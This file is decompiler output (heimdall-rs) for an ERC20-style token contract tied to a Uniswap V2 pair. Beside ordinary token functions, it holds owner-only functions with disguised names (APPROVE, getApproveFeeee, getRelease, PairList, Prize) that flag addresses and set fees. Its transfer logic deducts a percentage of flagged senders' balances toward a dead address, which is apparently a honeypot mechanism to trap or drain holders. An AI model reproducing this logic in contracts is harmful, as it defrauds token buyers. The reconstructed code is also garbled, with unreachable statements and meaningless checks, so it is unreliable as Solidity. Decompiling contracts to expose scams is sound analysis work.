// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.0
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    uint256 public constant Owner = 0;
    uint256 public constant uniswapV2Router = 697323163401596485410334513241460920685086001293;
    uint256 public constant decimals = 18;
    
    bytes32 store_a;
    address public uniswapV2Pair;
    mapping(bytes32 => bytes32) storage_map_b;
    address store_e;
    uint256 store_h;
    uint256 public totalSupply;
    bytes32 store_i;
    mapping(bytes32 => bytes32) storage_map_f;
    bytes32 store_d;
    
    event Approval(address, address, uint256);
    event OwnershipTransferred(address, address);
    
    /// @custom:selector    0x06fdde03
    /// @custom:signature   name() public view returns (string memory)
    function name() public view returns (string memory) {
        if (store_a) {
            if (store_a - ((store_a >> 0x01) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));
                bytes32 var_d = store_a >> 0x01;
                if (store_a) {
                    if (store_a - ((store_a >> 0x01) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_a >> 0x01) {
                            if (0x1f < (store_a >> 0x01)) {
                                var_a = 0x08;
                                var_e = storage_map_b[var_a];
                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {
                                    var_e = 0x20;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked(0x20, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0xa9059cbb
    /// @custom:signature   transfer(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function transfer(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        address var_a = msg.sender;
        var_b = 0x06;
        require(0x01 - (bytes1(storage_map_b[var_a])), "ERC20: transfer Amount exceeds balance");
        var_a = address(arg0);
        var_b = 0x05;
        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), "ERC20: transfer Amount exceeds balance");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        storage_map_b[var_a] = arg1 + storage_map_b[var_a];
        var_d = 0x01;
        return 0x01;
        require(address(msg.sender), "ERC20: transfer Amount exceeds balance");
        require(address(arg0), "ERC20: transfer Amount exceeds balance");
        var_a = address(msg.sender);
        var_b = 0x05;
        require(!(storage_map_b[var_a] < arg1), "ERC20: transfer Amount exceeds balance");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x26;
        var_g = 0x45524332303a207472616e7366657220416d6f756e7420657863656564732062;
        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;
        var_a = address(msg.sender);
        var_b = 0x0c;
        if (storage_map_b[var_a]) {
            if (!storage_map_b[var_a]) {
                if (!0) {
                    if (!address(uniswapV2Pair)) {
                        if (address(arg0) - (address(uniswapV2Pair))) {
                            require(bytes1(storage_map_b[var_a]), "ERC20: transfer to the zero address");
                            var_a = address(msg.sender);
                            var_b = 0x0d;
                            require(!(bytes1(storage_map_b[var_a])), "ERC20: transfer to the zero address");
                            var_a = address(msg.sender);
                            var_b = 0x0d;
                            require(!0, "ERC20: transfer to the zero address");
                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                            var_c = 0x11;
                            require(!(address(uniswapV2Pair)), "ERC20: transfer to the zero address");
                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                            var_c = 0x12;
                            require(address(arg0) - (address(uniswapV2Pair)), "ERC20: transfer to the zero address");
                            var_a = address(msg.sender);
                            var_b = 0x05;
                            require(address(msg.sender) - (address(uniswapV2Pair)), "ERC20: transfer to the zero address");
                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                            var_c = 0x11;
                            var_a = address(msg.sender);
                            var_b = 0x05;
                            storage_map_b[var_a] = storage_map_b[var_a] - ((storage_map_b[var_a] * arg1) / 0x64);
                            var_a = 0xdead;
                            require(storage_map_b[var_a] == ((storage_map_b[var_a] * arg1) / arg1) | !arg1, "ERC20: transfer to the zero address");
                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                            var_c = 0x11;
                            var_a = address(msg.sender);
                            var_b = 0x0d;
                            require(0x64, "ERC20: transfer to the zero address");
                        }
                    }
                    require(!((storage_map_b[var_a] * arg1) / 0x64), "ERC20: transfer to the zero address");
                    var_a = address(msg.sender);
                    var_b = 0x0d;
                    require(!(storage_map_b[var_a] - ((storage_map_b[var_a] * arg1) / 0x64) > storage_map_b[var_a]), "ERC20: transfer to the zero address");
                }
                require(!(store_d > (((storage_map_b[var_a] * arg1) / 0x64) + store_d)), "ERC20: transfer to the zero address");
                require(address(msg.sender) - (address(uniswapV2Pair)), "ERC20: transfer to the zero address");
                require(!0x01, "ERC20: transfer to the zero address");
                require(!(address(uniswapV2Pair)), "ERC20: transfer to the zero address");
                var_a = address(msg.sender);
                var_b = 0x0d;
                require(address(arg0) - (address(uniswapV2Pair)), "ERC20: transfer to the zero address");
            }
            var_a = address(msg.sender);
            var_b = 0x0d;
            require(address(msg.sender) - (address(uniswapV2Pair)), "ERC20: transfer to the zero address");
        }
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x23;
        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;
        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x25;
        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;
        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x39509351
    /// @custom:signature   increaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        address var_a = msg.sender;
        uint256 var_b = 0;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), "ERC20: approve to the zero address");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_b[var_a] = arg1 + storage_map_b[var_a];
        uint256 var_d = arg1 + storage_map_b[var_a];
        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);
        var_d = 0x01;
        return 0x01;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x22;
        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x24;
        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xa457c2d7
    /// @custom:signature   decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        address var_a = msg.sender;
        uint256 var_b = 0;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        require(!(storage_map_b[var_a] < arg1), "ERC20: decreased allowance below zero");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x25;
        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;
        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_b[var_a] = storage_map_b[var_a] - arg1;
        uint256 var_c = storage_map_b[var_a] - arg1;
        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x22;
        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x24;
        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xd32c99cd
    /// @custom:signature   Unresolved_d32c99cd(uint256 arg0, uint256 arg1) public pure
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function Unresolved_d32c99cd(uint256 arg0, uint256 arg1) public pure {
        require(!arg0 > 0xffffffffffffffff);
        require(!(arg0) > 0xffffffffffffffff);
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x41;
        require(!((var_c + (uint248(0x3f + (arg0 + 0x1f)))) < var_c) | ((var_c + (uint248(0x3f + (arg0 + 0x1f)))) > 0xffffffffffffffff));
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x41;
        uint256 var_c = var_c + (uint248(0x3f + (arg0 + 0x1f)));
        uint256 var_d = (arg0);
        var_e = msg.data[36:36];
        uint256 var_f = 0;
        require(!arg1 > 0xffffffffffffffff);
    }
    
    /// @custom:selector    0x1f478f1e
    /// @custom:signature   Unresolved_1f478f1e(address arg0, uint256 arg1) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function Unresolved_1f478f1e(address arg0, uint256 arg1) public payable {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(msg.sender == (address(store_e)), "Ownable: caller is not the Owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865204f776e6572;
        address var_e = address(arg0);
        var_f = 0x0c;
        storage_map_f[var_e] = arg1 | (uint248(storage_map_f[var_e]));
    }
    
    /// @custom:selector    0x23b872dd
    /// @custom:signature   Unresolved_23b872dd(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_23b872dd(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x70a08231
    /// @custom:signature   balanceOf(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function balanceOf(address arg0) public view returns (uint256) {
        require(arg0 == (address(arg0)));
        address var_a = address(arg0);
        var_b = 0x05;
        address var_c = storage_map_b[var_a];
        return storage_map_b[var_a];
    }
    
    /// @custom:selector    0x3de94b45
    /// @custom:signature   Prize(uint256 arg0) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function Prize(uint256 arg0) public payable {
        require(msg.sender == (address(store_e)), "Ownable: caller is not the Owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865204f776e6572;
        store_h = arg0;
    }
    
    /// @custom:selector    0x5dd7c8ac
    /// @custom:signature   getAprove(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function getAprove(address arg0) public view returns (uint256) {
        require(arg0 == (address(arg0)));
        require(msg.sender == (address(store_e)), "Ownable: caller is not the Owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865204f776e6572;
        address var_e = address(arg0);
        var_f = 0x0d;
        address var_a = storage_map_f[var_e];
        return storage_map_f[var_e];
    }
    
    /// @custom:selector    0x95d89b41
    /// @custom:signature   symbol() public view returns (string memory)
    function symbol() public view returns (string memory) {
        if (store_i) {
            if (store_i - ((store_i >> 0x01) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_i >> 0x01)) / 0x20) * 0x20));
                bytes32 var_d = store_i >> 0x01;
                if (store_i) {
                    if (store_i - ((store_i >> 0x01) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_i >> 0x01) {
                            if (0x1f < (store_i >> 0x01)) {
                                var_a = 0x09;
                                var_e = storage_map_b[var_a];
                                if ((0x20 + var_c) + (store_i >> 0x01) > (0x20 + (0x20 + var_c))) {
                                    var_e = 0x20;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked(0x20, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0xdd62ed3e
    /// @custom:signature   Unresolved_dd62ed3e(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_dd62ed3e(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x715018a6
    /// @custom:signature   renounceOwnership() public payable
    function renounceOwnership() public payable {
        require(msg.sender == (address(store_e)), "Ownable: caller is not the Owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865204f776e6572;
        store_e = 0 | (uint96(store_e));
        emit OwnershipTransferred(address(store_e), 0);
    }
    
    /// @custom:selector    0x80602410
    /// @custom:signature   getApproveFeeee(address arg0) public view returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function getApproveFeeee(address arg0) public view returns (bool) {
        require(arg0 == (address(arg0)));
        require(msg.sender == (address(store_e)), "Ownable: caller is not the Owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865204f776e6572;
        address var_e = address(arg0);
        var_f = 0x0c;
        address var_a = !(!bytes1(storage_map_f[var_e]));
        return !(!bytes1(storage_map_f[var_e]));
    }
    
    /// @custom:selector    0x095ea7b3
    /// @custom:signature   approve(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function approve(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        address var_a = address(msg.sender);
        uint256 var_b = 0;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_b[var_a] = arg1;
        uint256 var_c = arg1;
        emit Approval(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x22;
        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x24;
        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xf2fde38b
    /// @custom:signature   transferOwnership(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function transferOwnership(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(msg.sender == (address(store_e)), "Ownable: caller is not the Owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865204f776e6572;
        require(address(arg0), "Ownable: new Owner is the zero address");
        store_e = (address(arg0)) | (uint96(store_e));
        emit OwnershipTransferred(address(store_e), address(arg0));
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x26;
        var_d = 0x4f776e61626c653a206e6577204f776e657220697320746865207a65726f2061;
        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x2c91d071
    /// @custom:signature   PairList(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function PairList(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(msg.sender == (address(store_e)), "Ownable: caller is not the Owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865204f776e6572;
        uniswapV2Pair = (address(arg0)) | (uint96(uniswapV2Pair));
    }
    
    /// @custom:selector    0x6c9992b3
    /// @custom:signature   getRelease(address arg0) public view returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function getRelease(address arg0) public view returns (bool) {
        require(arg0 == (address(arg0)));
        require(msg.sender == (address(store_e)), "Ownable: caller is not the Owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865204f776e6572;
        address var_e = address(arg0);
        var_f = 0x06;
        address var_a = !(!bytes1(storage_map_f[var_e]));
        return !(!bytes1(storage_map_f[var_e]));
    }
    
    /// @custom:selector    0xc4e7c165
    /// @custom:signature   APPROVE(address arg0, uint256 arg1) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function APPROVE(address arg0, uint256 arg1) public payable {
        require(arg0 == (address(arg0)));
        require(msg.sender == (address(store_e)), "Ownable: caller is not the Owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865204f776e6572;
        address var_e = address(arg0);
        var_f = 0x0d;
        storage_map_f[var_e] = arg1;
    }
}